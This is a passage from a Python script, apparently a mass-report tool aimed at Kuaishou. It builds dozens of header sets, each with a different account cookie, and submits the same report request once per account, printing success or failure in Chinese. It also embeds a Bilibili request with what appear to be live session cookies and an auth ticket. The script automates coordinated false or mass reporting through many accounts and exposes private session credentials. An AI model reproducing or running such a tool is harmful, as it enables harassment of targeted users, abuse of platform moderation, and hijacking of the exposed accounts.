                 }

    headers21 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie19
                 }

    headers22 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie20
                 }

    headers23 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie21
                 }

    headers24 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie22
                 }

    headers25 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie23
                 }

    headers26 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie24
                 }

    headers27 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie25
                 }

    headers28 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie26
                 }

    headers29 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie27
                 }

    headers30 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie28
                 }

    headers31 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie29
                 }

    headers32 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie30
                 }

    headers33 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie31
                 }

    headers34 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie32
                 }

    headers35 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie33
                 }

    headers36 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie34
                 }

    headers37 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie35
                 }

    headers38 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie36
                 }

    headers39 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie37
                 }

    headers40 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie38
                 }

    headers41 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie39
                 }

    headers42 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie40
                 }

    headers43 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie41
                 }

    headers44 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie42
                 }

    headers45 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie43
                 }

    headers46 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie44
                 }

    headers47 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie45
                 }

    headers48 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie46
                 }

    headers49 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie47
                 }

    headers50 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie48
                 }

    headers51 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie49
                 }

    headers52 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie50
                 }

    headers53 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie51
                 }

    headers54 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie52
                 }

    headers55 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie53
                 }

    headers56 = {'User-Agent': AAA,
                 'Accept': "application/json",
                 'Accept-Encoding': "gzip, deflate",
                 'Content-Type': "application/json;charset=UTF-8",
                 'Origin': "https://app.m.kuaishou.com",
                 'X-Requested-With': "com.kuaishou.nebula",
                 'Sec-Fetch-Site': "same-origin",
                 'Sec-Fetch-Mode': "cors",
                 'Sec-Fetch-Dest': "empty",
                 'Referer': Referer,
                 'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                 'Cookie': Cookie54
                 }

    url1 = "https://api.bilibili.com/x/article/creative/draft/addupdate"

    headers1 = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 12; PERM00 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 os/android model/PERM00 build/7780300 osVer/12 sdkInt/31 network/2 BiliApp/7780300 mobi_app/android channel/oppo Buvid/XX312C33500FADDBC16249C21A72B412F7733 sessionID/ee5319ed innerVer/7780310 c_locale/zh_CN s_locale/zh_CN disable_rcmd/0 7.78.0 os/android model/PERM00 mobi_app/android build/7780300 channel/oppo innerVer/7780310 osVer/12 network/2",
        'Accept': "application/json, text/plain, */*",
        'native_api_from': "h5",
        'buvid': "XX312C33500FADDBC16249C21A72B412F7733",
        'referer': "https://www.bilibili.com/read/editor/?timestamp=1720683454801&theme=0#/",
        'content-type': "application/x-www-form-urlencoded; charset=utf-8",
        'x-bili-trace-id': "f740701d67bf535b2eb402cd53668f8b:2eb402cd53668f8b:0:0",
        'x-bili-aurora-eid': "UFcEQlAABlUFWw==",
        'x-bili-mid': "1354140427",
        'x-bili-aurora-zone': "",
        'x-bili-gaia-vtoken': "",
        'x-bili-ticket': "eyJhbGciOiJIUzI1NiIsImtpZCI6InMwMyIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjA3MTIyMjIsImlhdCI6MTcyMDY4MzEyMiwiYnV2aWQiOiJYWDMxMkMzMzUwMEZBRERCQzE2MjQ5QzIxQTcyQjQxMkY3NzMzIn0.PQyamr2AHmEexTPwZILJ0HHF5mepTgZANbBwwHYjUSE",
        'bili-http-engine': "cronet",
        'Cookie': "SESSDATA=72cf002d%2C1736234622%2C19f91b71CjAKGsI14ux7dZtKIvyMVLUGeZ8vTDhi0fn9KpzLCnX6rgEpFlWHFpJw5cJKlisbDM0SVjY5eEJSQUlaRHRkTnNQOWVET2M2Sk5qbFJJSjdlaHY5MEE4MW95VTZSeUZfWTUtejIxUmo5bXNxakJURG8yNy1sSHA3WjZqRGJOS0J4UTNCbFlEMWp3IIEC; bili_jct=c2511edb8246217fd7cee15c11225d74; DedeUserID=1354140427; DedeUserID__ckMd5=068b8d07b8c30df4; sid=ff5ej0q1; Buvid=XX312C33500FADDBC16249C21A72B412F7733"
    }
    yuluoyyds = '"result":1,"'

    response = requests.post(url1, data=payload1, headers=headers1)
    response0 = requests.post(url, data=payload, headers=headers2)
    if yuluoyyds in response0.text:
        print(green + '0' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('', red + '举报失败' + redd)
        data = response0.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response1 = requests.post(url, data=payload, headers=headers3)
    if yuluoyyds in response1.text:
        print(green + '1' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('1', red + '举报失败' + redd)
        data = response1.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response2 = requests.post(url, data=payload, headers=headers4)
    if yuluoyyds in response2.text:
        print(green + '2' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('2', red + '举报失败' + redd)
        data = response2.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response3 = requests.post(url, data=payload, headers=headers5)
    if yuluoyyds in response3.text:
        print(green + '3' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('3', red + '举报失败' + redd)
        data = response3.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response4 = requests.post(url, data=payload, headers=headers6)
    if yuluoyyds in response4.text:
        print(green + '4' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('4', red + '举报失败' + redd)
        data = response4.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response5 = requests.post(url, data=payload, headers=headers7)
    if yuluoyyds in response5.text:
        print(green + '5' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('5', red + '举报失败' + redd)
        data = response5.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response6 = requests.post(url, data=payload, headers=headers8)
    if yuluoyyds in response6.text:
        print(green + '6' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('6', red + '举报失败' + redd)
        data = response6.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response7 = requests.post(url, data=payload, headers=headers9)
    if yuluoyyds in response7.text:
        print(green + '7' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('7', red + '举报失败' + redd)
        data = response7.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response8 = requests.post(url, data=payload, headers=headers10)
    if yuluoyyds in response8.text:
        print(green + '8' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('8', red + '举报失败' + redd)
        data = response8.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response9 = requests.post(url, data=payload, headers=headers11)
    if yuluoyyds in response9.text:
        print(green + '9' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('9', red + '举报失败' + redd)
        data = response9.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response10 = requests.post(url, data=payload, headers=headers12)
    if yuluoyyds in response10.text:
        print(green + '10' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('10', red + '举报失败' + redd)
        data = response10.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response11 = requests.post(url, data=payload, headers=headers13)
    if yuluoyyds in response11.text:
        print(green + '11' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('11', red + '举报失败' + redd)
        data = response11.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response12 = requests.post(url, data=payload, headers=headers14)
    if yuluoyyds in response12.text:
        print(green + '12' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('12', red + '举报失败' + redd)
        data = response12.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response13 = requests.post(url, data=payload, headers=headers15)
    if yuluoyyds in response13.text:
        print(green + '13' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('13', red + '举报失败' + redd)
        data = response13.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response14 = requests.post(url, data=payload, headers=headers16)
    if yuluoyyds in response14.text:
        print(green + '14' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('14', red + '举报失败' + redd)
        data = response14.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response15 = requests.post(url, data=payload, headers=headers17)
    if yuluoyyds in response15.text:
        print(green + '15' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('15', red + '举报失败' + redd, )
        data = response15.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response16 = requests.post(url, data=payload, headers=headers18)
    if yuluoyyds in response16.text:
        print(green + '16' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('16', red + '举报失败' + redd)
        data = response16.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response17 = requests.post(url, data=payload, headers=headers19)
    if yuluoyyds in response17.text:
        print(green + '17' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('17', red + '举报失败' + redd)
        data = response17.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response18 = requests.post(url, data=payload, headers=headers20)
    if yuluoyyds in response18.text:
        print(green + '18' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('18', red + '举报失败' + redd)
        data = response18.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response19 = requests.post(url, data=payload, headers=headers21)
    if yuluoyyds in response19.text:
        print(green + '19' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('19', red + '举报失败' + redd)
        data = response19.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response20 = requests.post(url, data=payload, headers=headers22)
    if yuluoyyds in response20.text:
        print(green + '20' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('20', red + '举报失败' + redd, )
        data = response20.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response21 = requests.post(url, data=payload, headers=headers23)
    if yuluoyyds in response21.text:
        print(green + '21' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('21', red + '举报失败' + redd)
        data = response21.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response22 = requests.post(url, data=payload, headers=headers24)
    if yuluoyyds in response22.text:
        print(green + '22' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('22', red + '举报失败' + redd)
        data = response22.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response23 = requests.post(url, data=payload, headers=headers25)
    if yuluoyyds in response23.text:
        print(green + '23' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('23', red + '举报失败' + redd)
        data = response23.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response24 = requests.post(url, data=payload, headers=headers26)
    if yuluoyyds in response24.text:
        print(green + '24' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('24', red + '举报失败' + redd)
        data = response24.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response25 = requests.post(url, data=payload, headers=headers27)
    if yuluoyyds in response25.text:
        print(green + '25' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('25', red + '举报失败' + redd)
        data = response25.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response26 = requests.post(url, data=payload, headers=headers28)
    if yuluoyyds in response26.text:
        print(green + '26' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('26', red + '举报失败' + redd)
        data = response26.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response27 = requests.post(url, data=payload, headers=headers29)
    if yuluoyyds in response27.text:
        print(green + '27' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('27', red + '举报失败' + redd)
        data = response27.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response28 = requests.post(url, data=payload, headers=headers30)
    if yuluoyyds in response28.text:
        print(green + '28' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('28', red + '举报失败' + redd)
        data = response28.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response29 = requests.post(url, data=payload, headers=headers31)
    if yuluoyyds in response29.text:
        print(green + '29' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('29', red + '举报失败' + redd)
        data = response29.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response30 = requests.post(url, data=payload, headers=headers32)
    if yuluoyyds in response30.text:
        print(green + '30' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('30', red + '举报失败' + redd)
        data = response30.json()
        yuluonb = data["error_msg"]
        print("失败原因：", yuluonb)

    response31 = requests.post(url, data=payload, headers=headers33)
    if yuluoyyds in response31.text:
        print(green + '31' + redd, "举报成功，状态码：", response.status_code)
    else:
        print('31', red + '举报失败' + redd)
